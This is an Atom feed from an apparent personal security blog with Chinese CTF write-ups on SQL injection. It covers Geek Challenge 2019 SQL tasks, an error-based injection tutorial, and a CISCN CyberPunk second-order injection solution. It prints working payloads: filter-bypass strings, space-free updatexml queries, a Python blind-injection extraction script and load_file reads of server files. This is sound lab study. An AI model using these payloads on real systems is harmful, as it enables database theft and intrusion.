<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Artd33</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://artd33.github.io/"/>
  <updated>2020-01-10T16:34:57.433Z</updated>
  <id>https://artd33.github.io/</id>
  
  <author>
    <name>Artd33</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[极客大挑战 2019]SQL部分 WriteUp</title>
    <link href="https://artd33.github.io/2020/01/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-SQL%E9%83%A8%E5%88%86WriteUp/"/>
    <id>https://artd33.github.io/2020/01/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-SQL%E9%83%A8%E5%88%86WriteUp/</id>
    <published>2020-01-10T16:19:35.000Z</published>
    <updated>2020-01-10T16:34:57.433Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>极客大挑战2019的sql系列一共有5个题目，感觉非常有意思啊，就好像自己化身为了一名黑客。</p><h2 id="0x01-EasySQL"><a href="#0x01-EasySQL" class="headerlink" title="0x01 EasySQL"></a>0x01 EasySQL</h2><p>这题没什么好说的，万能密码一试就成功了。<br><a href="https://upload-images.jianshu.io/upload_images/20163356-24b487dfa3e66b12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-24b487dfa3e66b12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a><br>（网站做的确实非常精湛！！<br><a href="https://upload-images.jianshu.io/upload_images/20163356-aa37383e4f07239a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-aa37383e4f07239a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a></p><h2 id="0x02-LoveSQL"><a href="#0x02-LoveSQL" class="headerlink" title="0x02 LoveSQL"></a>0x02 LoveSQL</h2><p>用上面的万能密码登录进去后，没有flag，而是给出了一串密码，让人不禁联想到sql查询。在加上登录界面的提示，可以判断flag应该在数据库的某个地方。<br><a href="https://upload-images.jianshu.io/upload_images/20163356-8fb02041fe194d26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-8fb02041fe194d26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a><br>接下来在输入用户名处拼接常规的sql注入语句就行了。payload可以参考<a href="https://www.jianshu.com/p/29004c3dafbb" target="_blank" rel="noopener">我之前写的一篇文章</a></p><h2 id="0x03-BabySQL"><a href="#0x03-BabySQL" class="headerlink" title="0x03 BabySQL"></a>0x03 BabySQL</h2><p>这题应该才是我真正想写的一题。这题确实和登录界面说的一样，和之前的不同，做了严格的过滤。（2333<br><a href="https://upload-images.jianshu.io/upload_images/20163356-5330d4f46c49c9a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-5330d4f46c49c9a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a><br>不管是万能密码还是sql注入语句都报错了。我一开始试了挺久的，都一直报错，然后懒得思考就偷偷跑去看了下WP。我发现只要稍微动点脑子，就能发现很多关键单词比如or、where、select等都被替换为空了。解决的方法很简单，因为这道题只替换了一次，所以可以在一个单词里再写一个这个单词，比如把or写成oorr，就可以绕过这个“严格”的过滤了。</p><p><a href="https://upload-images.jianshu.io/upload_images/20163356-68be52de0c75530b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-68be52de0c75530b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a></p><p>查当前库名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect 1,2,database()#</span><br></pre></td></tr></tbody></table></figure></div><p>爆出所有表</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect 1,2,group_concat(distinct table_name) frfromom infoorrmation_schema.columns whwhereere table_schema = 'geek'#</span><br></pre></td></tr></tbody></table></figure></div><p>爆出所有列</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect 1,2,group_concat(distinct column_name) frfromom infoorrmation_schema.columns whwhereere table_name = 'b4bsql'#</span><br></pre></td></tr></tbody></table></figure></div><p>爆字段</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect 1,2,group_concat(id,0x3a,username,0x3a,passwoorrd) frofromm b4bsql#</span><br></pre></td></tr></tbody></table></figure></div><p>把全部数据爆出来这个方法确实挺不错的，不然这题那么多数据一个一个查得查多久啊…</p><h2 id="0x04-HardSQL"><a href="#0x04-HardSQL" class="headerlink" title="0x04 HardSQL"></a>0x04 HardSQL</h2><p>一开始先简单测试一下，发现过滤了空格，而且怎么绕都绕不过去(所以下面的payload都是无空格的)，然后去网上找wp发现是报错注入，推荐一篇报错注入的文章，<a href="[https://artd33.github.io/2020/01/04/sql-报错注入/](https://artd33.github.io/2020/01/04/sql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/)">报错注入</a>。值得注意的是这里用到了一个还没见过的新操作,用’^’来连接updatexml函数，结合了异或。</p><p>查当前数据库名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><p>查表名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>((table_schema)<span class="keyword">like</span>(<span class="string">'geek'</span>))),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><p>查列名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>((table_name)<span class="keyword">like</span>(<span class="string">'H4rDsq1'</span>))),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><p>最后这里查flag内容的时候，由于 updtexml最多显示32的长度，导致flag显示不全。然后用substr截取一下，发现substr被过滤了，于是上网找了另一种操作，用left和right截取函数分两次把完整的flag查出来了。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x05-FinalSQL"><a href="#0x05-FinalSQL" class="headerlink" title="0x05 FinalSQL"></a>0x05 FinalSQL</h2><p>这道题和之前的题不太一样，可以看到给出了5个紫色的选项，分别对应着5个不同的id，但是这几个id都没什么用。</p><p><a href="https://upload-images.jianshu.io/upload_images/20163356-f3c1001905a7ed2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-f3c1001905a7ed2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a></p><p>试着在用户名和密码处进行注入，但是发现用户名和密码处有严格的过滤，大部分SQL注入的关键词都被过滤了</p><p><a href="https://upload-images.jianshu.io/upload_images/20163356-90e99e8d2a28d6e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-90e99e8d2a28d6e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a></p><p>然后尝试在上面的那几个id处进行注入，发现空格也被过滤了，和上面的hardsql一样绕不过去，那么用上面hardsql的报错注入试试<br></p><p><a href="https://upload-images.jianshu.io/upload_images/20163356-bf00e7abd0cae8b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-bf00e7abd0cae8b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a></p><p>发现有东西被过滤了，测试了一下被过滤的是0x7e，把它改成~反而绕过了过滤，然后再试试</p><p><a href="https://upload-images.jianshu.io/upload_images/20163356-5ccdc69e6e7f08c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-5ccdc69e6e7f08c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a></p><p>然而可能是界面处理的比较好，并没有报错出什么有用的信息。主界面有个小提示，出现了SQL盲注的字样，那么来尝试一下布尔盲注吧。</p><p>结合异或注入的小技巧，构造id=1^1^1, 返回id =1的结果</p><p><a href="https://upload-images.jianshu.io/upload_images/20163356-58d8dac52479d12b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-58d8dac52479d12b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a></p><p>id=1^0^1，返回id = 0的结果（注意是三个感叹号）</p><p><a href="https://upload-images.jianshu.io/upload_images/20163356-44666cb600c14dc3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-44666cb600c14dc3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a></p><p>那么构造 id = 1^(length(database())>3)^1，返回的是id=1的结果，即(length(database())>3) = 1，是真的，说明当前数据库的长度大于3</p><p><a href="https://upload-images.jianshu.io/upload_images/20163356-aa27b0310c81fd16.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://upload-images.jianshu.io/upload_images/20163356-aa27b0310c81fd16.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800" class="lazyload" title></a></p><p>根据这个原理，构造id=1^(ascii(substr((select(database())),1,1))><strong>100</strong>)^1, 不停的改变100那里的数值，即可判断出当前数据库的第一个字符是什么</p><p>然后可以借助burpsuite的intruder模块，试出数据库名，表名等。也可以写python脚本，如果数据太长的话，不写脚本是很慢的。这里给出最后已经查出了表名(F1naI1y，根据前几题sql题知道放flag的列都是password)之后查字段内容的脚本。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://c1e6b438-7a2c-47fd-9473-96e47707df3a.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">180</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(distinct(password)))from(F1naI1y)),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')^1"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Click'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;极客大挑战2019的sql系列一共有5个题目，感觉非常有意思啊，就好像自己化身为了一名黑客。&lt;/p&gt;
&lt;h2 id=&quot;0x01-EasySQL&quot;&gt;&lt;a href=&quot;#0x01-EasySQL&quot; class=&quot;headerli
      
    
    </summary>
    
    
    
      <category term="sqli" scheme="https://artd33.github.io/tags/sqli/"/>
    
      <category term="writeup" scheme="https://artd33.github.io/tags/writeup/"/>
    
      <category term="极客大挑战" scheme="https://artd33.github.io/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>SQLI - 报错注入</title>
    <link href="https://artd33.github.io/2020/01/04/sql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://artd33.github.io/2020/01/04/sql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2020-01-04T07:17:34.000Z</published>
    <updated>2020-01-10T14:54:08.344Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>报错注入是sql注入的一种常见类型，通过构造特殊的sql语句，让信息以报错的形式显示出来。然而报错注入又有很多种，这里只写基于updatexml()和extractvalue()的报错注入，暂时先了解这两种吧。</p><h2 id="0x02-一个简单的例子"><a href="#0x02-一个简单的例子" class="headerlink" title="0x02 一个简单的例子"></a>0x02 一个简单的例子</h2><p>打开一个sqli-labs环境，可以看到id=1时的返回结果<br><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/1.png" data-fancybox="group" data-caption class="fancybox"><img width="700" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/1.png" class="lazyload"></a><br>构造如下语句，可以看到，报错显示XPath语法错误并且<strong>返回了当前的数据库名</strong><br><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/2.png" data-fancybox="group" data-caption class="fancybox"><img width="700" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/2.png" class="lazyload"></a></p><h2 id="0x03-updatexml函数和extractvalue函数"><a href="#0x03-updatexml函数和extractvalue函数" class="headerlink" title="0x03 updatexml函数和extractvalue函数"></a>0x03 updatexml函数和extractvalue函数</h2><p><strong>UPDATEXML (XML_document, XPath_string, new_value);</strong></p><ul><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值(改变XML_document中符合XPATH_string的值)</li></ul><p><strong>EXTRACTVALUE (XML_document, XPath_string);</strong></p><ul><li>这两个参数和上面的意思一样</li><li>作用：对XML文档进行查询(查询XML_document中符合XPATH_string的值)</li></ul><h2 id="0x05-原理分析"><a href="#0x05-原理分析" class="headerlink" title="0x05 原理分析"></a>0x05 原理分析</h2><p>updatexml函数和extractvalue函数的第二个参数XPath_string未满足XPath语法，报错并带出关键信息。有一点需要注意，这两个函数能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取</p><h2 id="0x04-Payload"><a href="#0x04-Payload" class="headerlink" title="0x04 Payload"></a>0x04 Payload</h2><p><strong>updatexml</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(select database()),0x7e),1)</span><br></pre></td></tr></tbody></table></figure></div><p><strong>extractvalue</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br></pre></td></tr></tbody></table></figure></div><p>还有很多骚操作，比如 有一道题的payload是这样的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#</span><br></pre></td></tr></tbody></table></figure></div><p>还有一道题是这样的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//无空格的注入语句</span><br><span class="line">1'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x05-更多报错注入方法"><a href="#0x05-更多报错注入方法" class="headerlink" title="0x05 更多报错注入方法"></a>0x05 更多报错注入方法</h2><p><a href="https://www.jianshu.com/p/2c281626a5dd" target="_blank" rel="noopener">https://www.jianshu.com/p/2c281626a5dd</a><br><a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdans/p/5412468.html</a></p></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h2&gt;&lt;p&gt;报错注入是sql注入的一种常见类型，通过构造特殊的
      
    
    </summary>
    
    
    
      <category term="sqli" scheme="https://artd33.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk WriteUp</title>
    <link href="https://artd33.github.io/2019/12/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-WriteUp/"/>
    <id>https://artd33.github.io/2019/12/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-WriteUp/</id>
    <published>2019-12-30T08:14:59.000Z</published>
    <updated>2020-01-01T02:40:21.421Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>1. 启动了一台机器后发现这是一个买游戏CyberPunk的界面，一共有提交订单，查看订单，修改订单和删除订单这几个功能</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/2.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height="400" alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/2.png" class="lazyload"></a><p>2. 查看源码发现最底下有个提示，说明可能存在<strong>文件包含</strong></p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/1.png" data-fancybox="group" data-caption class="fancybox"><img width height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/1.png" class="lazyload"></a><p>3. 用filter伪协议读出所有可以找到的页面和文件的源码，整理一下，开始分析可能存在的漏洞</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/4.png" data-fancybox="group" data-caption class="fancybox"><img width height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/4.png" class="lazyload"></a><p>4. 发现在confirm.php和change.php页面中存在注入漏洞，关键代码如下。提交订单时对姓名和电话都进行了过滤，但是没有过滤地址，导致在预编译处理之后，在修改订单处存在<strong>二次注入</strong>。在’old_address’=’”.$row[‘address’].”‘处，用了一开始提交的地址，从而造成了恶意代码的拼接。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//confirm.php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) && !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) && !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">{</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = $_POST[<span class="string">"address"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span>;</span><br><span class="line">        $fetch = $db->query($sql);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch->num_rows><span class="number">0</span>) {</span><br><span class="line">        $msg = $user_name.<span class="string">"已提交订单"</span>;</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        $sql = <span class="string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span>;</span><br><span class="line">        $re = $db->prepare($sql);</span><br><span class="line">        $re->bind_param(<span class="string">"sss"</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re->execute();</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//change.php</span></span><br><span class="line">$sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br></pre></td></tr></tbody></table></figure></div><p>5. 思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下<strong>报错注入</strong>攻击语句</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">'/flag.txt'</span>),<span class="number">1</span>,<span class="number">20</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//如果flag太长的话，通过改变<span class="keyword">substr</span>的起始值，就可以把flag剩下的部分查出来</span><br></pre></td></tr></tbody></table></figure></div><script>(function(){    var bp = document.createElement('script');    var curProtocol = window.location.protocol.split(':')[0];    if (curProtocol === 'https') {        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';    }    else {        bp.src = 'http://push.zhanzhang.baidu.com/push.js';    }    var s = document.getElementsByTagName("script")[0];    s.parentNode.insertBefore(bp, s);})();</script></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;1. 启动了一台机器后发现这是一个买游戏CyberPunk的界面，一共有提交订单，查看订单，修改订单和删除订单这几个功能&lt;/p&gt;
&lt;a href=&quot;https://cdn.jsdelivr.net/gh/Artd33/CDN
      
    
    </summary>
    
    
    
      <category term="sqli" scheme="https://artd33.github.io/tags/sqli/"/>
    
      <category term="writeup" scheme="https://artd33.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Training: MySQL I &amp; Training: MySQL II</title>
    <link href="https://artd33.github.io/2019/12/29/Training-MySQL-I-Training-MySQL-II/"/>
    <id>https://artd33.github.io/2019/12/29/Training-MySQL-I-Training-MySQL-II/</id>
    <published>2019-12-29T07:54:00.000Z</published>
    <updated>2020-01-01T02:40:31.665Z</updated>
    
